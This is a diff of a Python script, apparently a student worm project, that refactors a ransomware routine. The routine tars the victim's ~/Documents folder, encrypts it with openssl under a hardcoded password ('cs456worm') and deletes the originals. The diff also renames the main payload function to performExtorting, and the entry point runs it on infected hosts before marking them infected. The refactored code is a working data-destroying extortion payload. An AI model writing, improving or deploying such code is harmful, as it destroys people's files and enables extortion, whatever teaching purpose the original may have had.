@@ -359,12 +359,15 @@ def compressEncryptDelete(directory):
             tar.add(directory)
             # Close the tar file
             tar.close()
-
             print "Finished create tar file"
+        except tarfile.TarError as msg:
+            print "compressEncryptDelete function: " + tarName + ": "
+            print msg
+            return None
 
+        try:
             # Then we encrypt it.  We need to change open ssl to execute
             call(["chmod", "a+x", OPENSSL])
-
             print "Finished chmod openssl file"
             # Run the encryption
             password = "cs456worm"
@@ -376,25 +379,21 @@ def compressEncryptDelete(directory):
             # Call the program to encrypt it
             call(ARGS)
             print "Finished encrypted file"
+        except OSError as msg:
+            print "compressEncryptDelete function with call compression: "
+            print msg
+            return None
 
+        try:
             # Then we remove the directory
             shutil.rmtree(directory)
-
             # Finally we need to delete the tar file itself and only leave the
             # encrypted file
             os.remove(tarName)
             return tarName + ".enc"
 
-        except OSError as msg:
+        except (OSError, shutil.Error) as msg:
             print "compressEncryptDelete function:"
-            print msg
-            return None
-        except shutil.Error as msg:
-            print "compressEncryptDelete function:"
-            print msg
-            return None
-        except tarfile.TarError as msg:
-            print "compressEncryptDelete function: " + tarName + ": "
             print msg
             return None
 
@@ -428,7 +427,7 @@ def leaveRansomNote(tarName):
 #===============================================================================
 # Perform malicious action
 #===============================================================================
-def performMalicious():
+def performExtorting():
     # Compress the user Documents directory
     docDir = os.path.expanduser("~") + "/Documents"
     encryptedFile = None
@@ -464,7 +463,7 @@ if __name__ == "__main__":
         else:
             # Otherwise we perform some malicious action
             fromHost = sys.argv[1]
-            performMalicious()
+            performExtorting()
 
             # Then mark the system as infected
             markSystemAsInfected(fromHost)
